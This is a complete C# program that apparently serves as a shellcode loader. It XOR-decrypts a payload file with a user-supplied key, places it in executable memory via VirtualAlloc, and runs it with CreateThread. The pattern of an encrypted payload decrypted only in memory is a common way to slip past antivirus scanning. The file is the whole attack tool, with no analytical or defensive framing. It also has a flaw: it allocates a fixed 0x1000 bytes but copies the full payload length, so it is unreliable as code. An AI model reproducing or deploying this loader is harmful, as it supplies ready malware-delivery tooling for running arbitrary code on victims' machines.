using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace DecryptExec
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds);

        static byte[] XorByteArray(byte[] inputBytes, string key)
        {
            byte[] result = new byte[inputBytes.Length];
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            // For each input byte
            for (int i = 0; i < inputBytes.Length; i++)
            {
                // XOR next bytes from input and key byte arrays
                result[i] = (byte)(inputBytes[i] ^ (byte)keyBytes[i % key.Length]);
            }
            return result;
        }

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Error: Please provide 1) the path to the binary file and 2) the key to decrypt it.");
                Environment.Exit(1);
            }
            if (!File.Exists(args[0]))
            {
                Console.WriteLine("Could not find file at provided path: {0}", args[0]);
                Environment.Exit(1);
            }

            // Get code from file
            byte[] codeBytes = File.ReadAllBytes(args[0]);

            // Get decryption key
            string key = args[1];

            // Perform XOR operation to decrypt code
            byte[] origBytes = XorByteArray(codeBytes, key);

            // Execute original code
            int size = origBytes.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(origBytes, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}